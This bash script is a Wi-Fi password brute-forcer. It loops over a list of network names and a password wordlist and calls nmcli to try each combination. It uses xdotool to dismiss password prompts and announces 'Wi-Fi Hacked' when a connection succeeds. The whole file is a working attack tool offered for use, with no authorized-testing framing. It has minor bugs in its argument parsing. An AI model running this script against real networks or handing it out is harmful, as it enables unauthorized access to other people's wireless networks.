#!/bin/bash
# Usage instructions
usage() {
    echo -e "-s | --ssid: Enter a /path/to/file.txt containing list of SSIDs to try. Default ssid.txt"
    echo -e "-w | --wordlist: Enter a /path/to/file.txt containing a list of passwords. Default passwords.txt"
    echo -e "-h | --help: Display usage instructions"
}

ssid_file=$(cat ssid.txt)
password_file=$(cat passwords.txt)

# Replace variables with user-defined values
while [ "$1" != "" ]; do
    case $1 in
    -s | --ssid)
        shift
        ssid_file=$(cat "$1")
        ;;
    -w | --wordlist)
        password_file=$(cat "$2")
        ;;
    -h | --help)
        usage
        exit
        ;;
    esac
    shift
done

# List of SSIDs and PASSWORDS to iterate over
SSIDS=()
PASSWORDS=()

# Write all lines of defined file into the SSID and PASSWORD array
for line in $ssid_file; do
    SSIDS+=("$line")
    ((index++))
done

for pass in $password_file; do
    PASSWORDS+=("$pass")
    ((index++))
done

# Check current connection status
function check_already_connected() {
    local ssid=$1
    #   local current_ssid=$(nmcli -t -f active,ssid dev wifi | grep yes | cut -d ':' -f2) Shellcheck Error: SC2154 Check this: https://www.shellcheck.net/wiki/SC2155
    current_ssid=$(nmcli -t -f active,ssid dev wifi | grep yes | cut -d ':' -f2)
    local current_ssid
    if [[ "$current_ssid" == "$ssid" ]]; then
        echo -e "\t \e[35m<<< Already connected to \e[35m$ssid >>>\e[0m"
        return 0 # 0 = true in bash script
    else
        return 1 # 1 = false in bash script
    fi
}

# Loop through each SSID
for SSID in "${SSIDS[@]}"; do
    echo -e "\n\t \e[34mAttempting to connect to\e[35m $SSID\n \e[0m"
    if check_already_connected "$SSID"; then
        continue # Skip to the next SSID if already connected
    fi
    # Loop through each password
    for PASSWORD in "${PASSWORDS[@]}"; do
        # Attempt to connect
        echo -e "  🔎 Trying password \e[35m$PASSWORD\e[0m"
        nmcli dev wifi connect "$SSID" password "$PASSWORD" &
        PID=$!
        sleep 1 # Wait a short period to ensure the dialog has time to appear

        # Keep sending Escape key every 2 seconds until the nmcli command finishes
        while kill -0 $PID 2>/dev/null; do
            xdotool key Escape
            sleep 2
        done

        # Check if connected
        # CURRENT_SSID=$(nmcli -t -f active,ssid dev wifi | grep yes | cut -d ':' -f2)
        CURRENT_SSID=$(nmcli -t -f active,ssid dev wifi | grep yes | cut -d ':' -f1)
        if [ "$CURRENT_SSID" == "yes" ]; then
            echo -e "\n\e[32m\t🎉 Success: Connected to $SSID with password \e[35m$PASSWORD\n\e[0m"
            echo -e "\e[32m\n\t\t\t💀 Wi-Fi Hacked 💀\n\n"
            break 2 # Exit both loops
        else
            echo -e "\e[31m\t🚫 Failed to connect to $SSID with password \e[35m$PASSWORD\n\e[0m"
        fi
    done
done

# echo -e "\e[32m\n\t\t\t💀 Wi-Fi Hacked 💀\n\n" (This line should be printed once the connection has been established. Right now, the tool will print Wi-Fi Hacked even if the brute force fails 💀)
